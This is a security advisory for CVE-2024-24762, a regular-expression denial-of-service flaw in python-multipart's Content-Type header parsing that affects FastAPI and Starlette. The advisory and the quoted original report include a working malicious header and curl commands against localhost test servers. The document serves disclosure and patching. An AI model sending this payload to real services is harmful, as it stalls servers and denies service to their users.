# [H] python-multipart vulnerable to Content-Type Header ReDoS

## Summary
Severity: High
Advisory: GHSA-2jv5-9r88-3w3p
CVE: CVE-2024-24762
CWE: CWE-400
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-02-12
Source: https://github.com/advisories/GHSA-2jv5-9r88-3w3p
Type: github-advisory

## Affected
- PyPI: `python-multipart` — affected >=0 <0.0.7

## Details
### Summary

When using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.

An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.

This can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

This only applies when the app uses form data, parsed with `python-multipart`.

### Details

A regular HTTP `Content-Type` header could look like:

```
Content-Type: text/html; charset=utf-8
```

`python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74

A custom option could be made and sent to the server to break it with:

```
Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
```

### PoC

Create a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:

```Python
# main.py
from wsgiref.simple_server import make_server
from wsgiref.validate import validator

from multipart.multipart import parse_options_header


def simple_app(environ, start_response):
    _, _ = parse_options_header(environ["CONTENT_TYPE"])

    start_response("200 OK", [("Content-type", "text/plain")])
    return [b"Ok"]


httpd = make_server("", 8123, validator(simple_app))
print("Serving on port 8123...")
httpd.serve_forever()
```

Then send the attacking request with:

```console
$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'
```

### Impact

This is a ReDoS, (Regular expression Denial of Service), so it only applies to those using python-multipart to read form data, such as Starlette and FastAPI.

### Original Report

This was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r

<details>
<summary>Original report to FastAPI</summary>

Hey Tiangolo!

My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).

Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:

```Python
from typing import Annotated
from fastapi.responses import HTMLResponse
from fastapi import FastAPI,Form
from pydantic import BaseModel

class Item(BaseModel):
    username: str

app = FastAPI()

@app.get("/", response_class=HTMLResponse)
async def index():
    return HTMLResponse("Test", status_code=200)

@app.post("/submit/")
async def submit(username: Annotated[str, Form()]):
    return {"username": username}

@app.post("/submit_json/")
async def submit_json(item: Item):
    return {"username": item.username}
```

I'm running the above with uvicorn with the following command:

```console
uvicorn server:app
```

Then run the following cUrl command:

```
curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'
```

You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%

You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.

If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.

Cheers

#### Impact

An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.

#### Occurrences

[params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)

</details>

## References
- https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p
- https://nvd.nist.gov/vuln/detail/CVE-2024-24762
- https://github.com/github/advisory-database/pull/4829
- https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4
- https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5
- https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc
- https://github.com/Kludex/python-multipart
- https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74
- https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml
- https://github.com/tiangolo/fastapi/releases/tag/0.109.1
